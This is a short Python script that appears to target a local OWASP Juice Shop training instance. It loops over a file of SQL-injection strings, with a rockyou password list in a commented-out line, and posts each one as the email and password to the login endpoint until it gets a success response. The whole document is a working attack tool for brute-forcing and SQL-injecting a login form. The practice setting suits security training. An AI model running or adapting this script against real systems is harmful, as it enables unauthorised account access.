import requests
import json

lines=[]
print("Start")
#passwordfilepath='/usr/share/wordlists/rockyou.txt'
passwordfilepath='/home/crashr/git/juiceshop/sqli.txt'

with open(passwordfilepath,mode='rb') as f:
    lines = f.readlines()
    
url='http://localhost:3000/rest/user/login'
for line in lines:
    password=str(line, 'UTF-8').strip()
    #payload={'email':'admin@juice-sh.op','password':f"{password}"}
    payload={'email':f"{password}",'password':f"{password}"}
    res=requests.post(url,payload)
    if 200 == res.status_code:
        print(f'SUCCESS with {password}')
        break
    else:
        print(f'	  NO: {password}')